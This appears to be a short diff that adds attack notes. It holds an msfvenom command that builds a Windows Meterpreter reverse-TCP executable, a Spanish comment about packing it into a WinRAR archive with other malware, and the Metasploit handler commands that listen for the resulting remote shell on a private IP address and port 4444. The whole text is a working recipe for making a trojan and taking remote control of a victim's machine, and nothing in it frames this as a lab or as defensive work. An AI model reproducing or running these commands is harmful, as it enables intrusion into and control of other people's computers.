@@ -1,0 +1,9 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.169 LPORT=4444 -f exe -o nuevo.exe
+####pasamos el programa y lo pasamos al winrar junto al otro malware y desde linux ponemos modo escucha
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.100.169
+set LPORT 4444
+show options
+exploit
